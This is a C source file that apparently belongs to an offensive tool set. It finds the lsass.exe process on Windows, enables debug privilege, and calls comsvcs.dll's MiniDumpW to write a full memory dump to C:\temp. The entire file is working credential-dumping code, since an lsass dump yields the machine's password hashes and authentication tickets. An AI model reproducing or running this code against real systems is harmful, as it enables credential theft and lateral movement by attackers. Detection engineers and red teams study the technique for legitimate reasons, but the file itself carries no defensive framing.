// Inspired from: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/

#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include "../functions.h"

typedef HRESULT(WINAPI* _MiniDumpW)(
    DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable,
    BOOL CurrentThread, PULONG Enabled);


// "<pid> <dump.bin> full"
int main(int argc, wchar_t* argv[]) {
    HRESULT             hr;
    _MiniDumpW          MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;
    ULONG  t;
    wchar_t format_cmdline[] = L"%i C:\\temp\\lsass_from_exe.dmp full";
    wchar_t cmdline[256];
    DWORD pid;

    // Get process ID of lsass
    pid = FindProcessId(L"lsass.exe");

    // build cmdline
    swprintf(cmdline, sizeof(format_cmdline), format_cmdline, pid);

    // Get proc address
    MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

    if (MiniDumpW == NULL) {
        printf("Unable to resolve COMSVCS!MiniDumpW.\n");
        return 0;
    }
    // try enable debug privilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);

    printf("Invoking COMSVCS!MiniDumpW(\"%ws\")\n", cmdline);

    // dump process
    MiniDumpW(0, 0, cmdline);
    printf("OK!\n");

    return 0;
}